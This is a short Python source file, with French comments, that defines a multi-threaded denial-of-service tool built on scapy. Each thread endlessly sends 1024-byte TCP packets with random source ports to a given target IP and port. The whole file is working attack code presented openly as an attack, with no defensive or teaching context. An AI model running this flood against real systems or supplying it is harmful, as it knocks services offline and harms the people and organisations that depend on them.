from scapy.all import IP,send,Raw,threading,TCP
from random import randint

def attack(target_ip, target_port=80, threads=4):
    """Attaque DoS multi-threaded"""
    def flood():
        while True:
            s_port = randint(1024, 65535)
            packet = IP(dst=target_ip)/TCP(sport=s_port, dport=target_port)/Raw(load="X"*1024)
            send(packet, verbose=False)
    # Lancement des threads
    for _ in range(threads):
        threading.Thread(target=flood).start()